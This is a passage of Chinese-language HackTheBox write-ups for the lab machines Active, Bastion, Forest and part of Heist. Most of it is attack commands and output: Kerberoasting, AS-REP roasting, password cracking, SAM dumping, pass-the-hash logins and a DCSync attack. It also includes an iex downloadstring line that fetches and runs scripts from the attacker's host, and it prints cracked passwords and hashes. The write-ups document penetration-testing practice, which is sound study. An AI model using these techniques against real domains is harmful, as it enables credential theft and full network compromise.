class="string">&quot;&quot;</span> fullName=<span class="string">&quot;&quot;</span> description=<span class="string">&quot;&quot;</span> cpassword=<span class="string">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span> changeLogon=<span class="string">&quot;0&quot;</span> noChange=<span class="string">&quot;1&quot;</span> neverExpires=<span class="string">&quot;1&quot;</span> acctDisabled=<span class="string">&quot;0&quot;</span> userName=<span class="string">&quot;active.htb\SVC_TGS&quot;</span>/&gt;&lt;/User&gt;</span><br><span class="line">&lt;/Groups&gt;</span><br></pre></td></tr></table></figure><p>解密得到明文密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</span><br><span class="line">GPPstillStandingStrong2k18</span><br></pre></td></tr></table></figure><p>这里本来以为是用<code>evil-winrm</code>或者<code>psexec</code>Getshell的，没想到是smb登入<code>users</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.100/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18</span><br><span class="line">get svc_tgs\desktop\user.txt</span><br><span class="line"></span><br><span class="line">cat svc_tgs\\desktop\\user.txt </span><br><span class="line">86d67d8ba232bb6a254aa4d10159e983</span><br></pre></td></tr></table></figure><h2 id="权限提升-7"><a class="markdownIt-Anchor" href="#权限提升-7"></a> 权限提升</h2><p>Kerberoasting</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile getuserspns.out</span><br></pre></td></tr></table></figure><p>（跑的时候出了个时间差过大的错误，头疼）<br />同步时间</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -u 10.10.10.100</span><br></pre></td></tr></table></figure><p>爆破票据</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs getuserspns.out </span><br><span class="line"></span><br><span class="line">Ticketmaster1968 (?)</span><br></pre></td></tr></table></figure><p>查看SMB路径权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.100 -u administrator -p Ticketmaster1968</span><br><span class="line"></span><br><span class="line">Disk                                                  PermissionsComment</span><br><span class="line">----                                                  ------------------</span><br><span class="line">ADMIN$                                            READ, WRITERemote Admin</span><br><span class="line">attacker_folder                                   READ, WRITE</span><br><span class="line">C$                                                READ, WRITEDefault share</span><br><span class="line">IPC$                                              NO ACCESSRemote IPC</span><br><span class="line">NETLOGON                                          READ, WRITELogon server share </span><br><span class="line">Replication                                       READ ONLY</span><br><span class="line">SYSVOL                                            READ, WRITELogon server share </span><br><span class="line">Users</span><br></pre></td></tr></table></figure><p>有写权限，直接psexec</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py active.htb/administrator@10.10.10.100</span><br><span class="line">Ticketmaster1968</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> \users\administrator\desktop\root.txt</span><br><span class="line">b5fc76d1d6b91d77b2fbf2d54d0f708b</span><br></pre></td></tr></table></figure><hr /><h1 id="hackthebox_bastion"><a class="markdownIt-Anchor" href="#hackthebox_bastion"></a> HackTheBox_Bastion</h1><h2 id="端口扫描-8"><a class="markdownIt-Anchor" href="#端口扫描-8"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.134</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.134</span><br><span class="line">Host is up (0.59s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="hackthebox_漏洞利用"><a class="markdownIt-Anchor" href="#hackthebox_漏洞利用"></a> HackTheBox_漏洞利用</h2><p>smbmap扫描路径</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.134 -u <span class="built_in">test</span></span><br><span class="line">Disk                                                  PermissionsComment</span><br><span class="line">----                                                  ------------------</span><br><span class="line">ADMIN$                                            NO ACCESSRemote Admin</span><br><span class="line">Backups                                           READ, WRITE</span><br><span class="line">C$                                                NO ACCESSDefault share</span><br><span class="line">IPC$                                              READ ONLYRemote IPC</span><br></pre></td></tr></table></figure><p>可以看到有两个VHD文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.134/backups</span><br><span class="line"></span><br><span class="line">dir WindowsImageBackup\L4mpje-PC\&quot;Backup 2019-02-22 124351<span class="string">&quot;\</span></span><br><span class="line"><span class="string">  .                                  Dn        0  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  ..                                 Dn        0  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 20:44:03 2019</span></span><br><span class="line"><span class="string">  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  BackupSpecs.xml                    An     1186  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7735807 blocks of size 4096. 2757267 blocks available</span></span><br></pre></td></tr></table></figure><p>先挂载SMB服务的文件，再将VHD文件挂载到本地磁盘</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/vhd</span><br><span class="line">mkdir /tmp/l4mpje-pc</span><br><span class="line">mount -t cifs //10.10.10.134/backups/WindowsImageBackup/L4mpje-PC  /tmp/l4mpje-pc/ -o user=anonymous</span><br><span class="line">modprobe nbd max_part=16</span><br><span class="line">qemu-nbd -r -c /dev/nbd0 <span class="string">&quot;/tmp/l4mpje-pc/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd&quot;</span></span><br><span class="line">mount -r /dev/nbd0p1 /tmp/vhd</span><br></pre></td></tr></table></figure><p>复制SAM文件和SYSTEM文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /tmp/vhd/Windows/System32/config/SYSTEM /root/</span><br><span class="line">cp /tmp/vhd/Windows/System32/config/SAM /root/</span><br></pre></td></tr></table></figure><p>取消挂载</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">umount /tmp/vhd</span><br><span class="line">qemu-nbd -d /dev/nbd0</span><br><span class="line">rmmod nbd</span><br><span class="line">umount /tmp/l4mpje-pc</span><br></pre></td></tr></table></figure><p>dump出Hash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py <span class="built_in">local</span> -system /root/SYSTEM -sam /root/SAM</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><p>解密得到明文</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">bureaulampje     (?)</span><br></pre></td></tr></table></figure><p>SSH登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh L4mpje@10.10.10.134</span><br><span class="line">bureaulampje</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> Desktop\user.txt                                                                            </span><br><span class="line">9bfe57d5c3309db3a151772f9d86c6cd</span><br></pre></td></tr></table></figure><h2 id="权限提升-8"><a class="markdownIt-Anchor" href="#权限提升-8"></a> 权限提升</h2><p>找到<code>mRemoteNG</code>程序的凭证储存</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> \Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml</span><br><span class="line"></span><br><span class="line">Username=<span class="string">&quot;Administrator&quot;</span> Domain=<span class="string">&quot;&quot;</span> Password=<span class="string">&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;</span></span><br></pre></td></tr></table></figure><p>还原管理员口令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/kmahyyg/mremoteng-decrypt/master/mremoteng_decrypt.py</span><br><span class="line">python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==</span><br><span class="line"></span><br><span class="line">Password: thXLHM96BeKL0ER2</span><br></pre></td></tr></table></figure><p>ssh登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh administrator@10.10.10.134</span><br><span class="line">thXLHM96BeKL0ER2</span><br><span class="line"><span class="built_in">type</span> \Users\Administrator\Desktop\root.txt                    </span><br><span class="line"></span><br><span class="line">958850b91811676ed6620a9c430e65c8</span><br></pre></td></tr></table></figure><hr /><h1 id="hackthebox_forest"><a class="markdownIt-Anchor" href="#hackthebox_forest"></a> HackTheBox_Forest</h1><h2 id="端口扫描-9"><a class="markdownIt-Anchor" href="#端口扫描-9"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.161</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.161</span><br><span class="line">Host is up (0.081s latency).</span><br><span class="line">Not shown: 989 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">53/tcp   open  domain       Microsoft DNS</span><br><span class="line">88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-05 14:34:46Z)</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-8"><a class="markdownIt-Anchor" href="#漏洞利用-8"></a> 漏洞利用</h2><p>还是DC</p><p>跑出来域名和一些用户名</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 10.10.10.161</span><br><span class="line"></span><br><span class="line"> =========================================== </span><br><span class="line">|    Getting domain SID <span class="keyword">for</span> 10.10.10.161    |</span><br><span class="line"> =========================================== </span><br><span class="line">Domain Name: HTB</span><br><span class="line">Domain Sid: S-1-5-21-3072663084-364016917-1341370565</span><br><span class="line">[+] Host is part of a domain (not a workgroup)</span><br><span class="line"></span><br><span class="line">-----</span><br><span class="line"></span><br><span class="line"> ============================= </span><br><span class="line">|    Users on 10.10.10.161    |</span><br><span class="line"> ============================= </span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]</span><br><span class="line">user:[<span class="variable">$331000</span>-VK4ADACQNUCA] rid:[0x463]</span><br><span class="line">user:[SM_2c8eef0a09b545acb] rid:[0x464]</span><br><span class="line">user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]</span><br><span class="line">user:[SM_75a538d3025e4db9a] rid:[0x466]</span><br><span class="line">user:[SM_681f53d4942840e18] rid:[0x467]</span><br><span class="line">user:[SM_1b41c9286325456bb] rid:[0x468]</span><br><span class="line">user:[SM_9b69f1b9d2cc45549] rid:[0x469]</span><br><span class="line">user:[SM_7c96b981967141ebb] rid:[0x46a]</span><br><span class="line">user:[SM_c75ee099d0a64c91b] rid:[0x46b]</span><br><span class="line">user:[SM_1ffab36a2f5f479cb] rid:[0x46c]</span><br><span class="line">user:[HealthMailboxc3d7722] rid:[0x46e]</span><br><span class="line">user:[HealthMailboxfc9daad] rid:[0x46f]</span><br><span class="line">user:[HealthMailboxc0a90c9] rid:[0x470]</span><br><span class="line">user:[HealthMailbox670628e] rid:[0x471]</span><br><span class="line">user:[HealthMailbox968e74d] rid:[0x472]</span><br><span class="line">user:[HealthMailbox6ded678] rid:[0x473]</span><br><span class="line">user:[HealthMailbox83d6781] rid:[0x474]</span><br><span class="line">user:[HealthMailboxfd87238] rid:[0x475]</span><br><span class="line">user:[HealthMailboxb01ac64] rid:[0x476]</span><br><span class="line">user:[HealthMailbox7108a4e] rid:[0x477]</span><br><span class="line">user:[HealthMailbox0659cc1] rid:[0x478]</span><br><span class="line">user:[sebastien] rid:[0x479]</span><br><span class="line">user:[lucinda] rid:[0x47a]</span><br><span class="line">user:[svc-alfresco] rid:[0x47b]</span><br><span class="line">user:[andy] rid:[0x47e]</span><br><span class="line">user:[mark] rid:[0x47f]</span><br><span class="line">user:[santi] rid:[0x480]</span><br></pre></td></tr></table></figure><blockquote><p>Typically that requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.</p></blockquote><blockquote><p><a href="https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting">https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting</a></p></blockquote><p>AS-REP Roasting</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py HTB/svc-alfresco -request -no-pass -dc-ip 10.10.10.161</span><br><span class="line">Impacket v0.9.23.dev1 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> svc-alfresco</span><br><span class="line">$krb5asrep$23<span class="variable">$svc</span>-alfresco@HTB:74aacc88dcebdc99fbdfad38ea7bfb86<span class="variable">$0f390178e508b52f3547f4784f435ca5955e6086b719aab1723ec0d13c900d4b0b7e4a00c10162b5615fb8c93e90f34a1746b5de60400cac0a2eae9ecab1a1d16f1d41958d72811ba73835e3177ea538e77888a207a47537c83644879fa792b5d31b965dd75aef7409dc34ba0b2df67eb987db6779846f330d563277f97e004484f67e7a853beec8e7552b427ac4c43fabd3f523a365f80a43f90f587ee08bbc8d06ad907d9efc5a6541714f92fe3c7626dd539daa45d54a4ef5733579277c65f7d11ca380184131a767428ca62077e4553fd8d86d1e7340da4b41b115357485</span></span><br></pre></td></tr></table></figure><p>爆破口令明文</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">s3rvice          ($krb5asrep$23<span class="variable">$svc</span>-alfresco@HTB)</span><br></pre></td></tr></table></figure><p>evil-winrm登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice</span><br><span class="line"><span class="built_in">type</span> C:\users\svc-alfresco\desktop\user.txt</span><br><span class="line"></span><br><span class="line">e5e4e47ae7022664cda6eb013fb0d9ed</span><br></pre></td></tr></table></figure><h2 id="权限提升-9"><a class="markdownIt-Anchor" href="#权限提升-9"></a> 权限提升</h2><p>下载bloodhound的powershell版本的collector，开启HTTP服务和SMB服务(impacket)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1</span><br><span class="line">wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</span><br><span class="line">python -m http.server 9998&amp;</span><br><span class="line">python smbserver.py Bufferfly . -smb2support -username Buffer -password fly&amp;</span><br></pre></td></tr></table></figure><p>靶机上下载bloodhound collector并回传输出文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadstring(<span class="string">&quot;http://10.10.16.11:9998/PowerView.ps1&quot;</span>)</span><br><span class="line">iex(new-object net.webclient).downloadstring(<span class="string">&quot;http://10.10.16.11:9998/SharpHound.ps1&quot;</span>)</span><br><span class="line">powershell -<span class="built_in">exec</span> bypass</span><br><span class="line">invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</span><br><span class="line">net use \\10.10.16.11\Bufferfly /u:Buffer fly</span><br><span class="line">copy 20210705223815_BloodHound.zip \\10.10.16.11\Bufferfly\</span><br><span class="line">net use /d \\10.10.16.11\Bufferfly</span><br></pre></td></tr></table></figure><p>bloodhound的内容实在是看不懂，看了WP<br />大概思路是</p><ol><li>用户&quot;svc-alfresco&quot;拥有账户操作权限，可以创建域账户</li><li>用户&quot;svc-alfresco&quot;完全控制&quot;Exchange Windows Permissions&quot;组(GenericAll)，可以将&quot;svc-alfresco&quot;加入&quot;Exchange Windows Permissions&quot;组</li><li>&quot;Exchange Windows Permissions&quot;组可以修改域用户的ACL(WriteDacl)</li><li>用户&quot;svc-alfresco&quot;利用&quot;Exchange Windows Permissions&quot;组的权限赋予&quot;DCSync&quot;权限</li><li>利用这个域账户进行DCSync攻击</li></ol><p>添加域用户</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user bufferfly bufferfly /add /domain</span><br></pre></td></tr></table></figure><p>执行命令后重新Getshell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-ADGroupMember -Identity <span class="string">&quot;Exchange Windows Permissions&quot;</span> -Members svc-alfresco</span><br></pre></td></tr></table></figure><p>查看组</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups</span><br><span class="line"></span><br><span class="line">HTB\Exchange Windows Permissions           Group            S-1-5-21-3072663084-364016917-1341370565-1121 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">HTB\Exchange Trusted Subsystem             Group            S-1-5-21-3072663084-364016917-1341370565-1119 Mandatory group, Enabled by default, Enabled grou</span><br></pre></td></tr></table></figure><p>添加DCSync权限(PowerView.ps1)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity <span class="string">&quot;DC=htb,DC=local&quot;</span> -PrincipalIdentity bufferfly -Rights DCSync</span><br></pre></td></tr></table></figure><p>DCSync攻击</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -just-dc <span class="string">&quot;htb/bufferfly:bufferfly@10.10.10.161&quot;</span></span><br><span class="line"></span><br><span class="line">htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::</span><br></pre></td></tr></table></figure><p>Hash登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6</span><br><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line"></span><br><span class="line">f048153f202bbb2f82622b04d79129cc</span><br></pre></td></tr></table></figure><p>貌似svc-alfresco不是域用户，而DCSync的操作需要一个域用户的凭证</p><p>Powershell在运行命令时貌似会自动地从ps1文件载入函数，很方便</p><hr /><h1 id="hackthebox_heist"><a class="markdownIt-Anchor" href="#hackthebox_heist"></a> HackTheBox_Heist</h1><h2 id="端口扫描-10"><a class="markdownIt-Anchor" href="#端口扫描-10"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.149</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.149</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-9"><a class="markdownIt-Anchor" href="#漏洞利用-9"></a> 漏洞利用</h2><p>访问<code>http://10.10.10.149/attachments/config.txt</code></p><ul><li>cisco的密码可以在线破解(<a 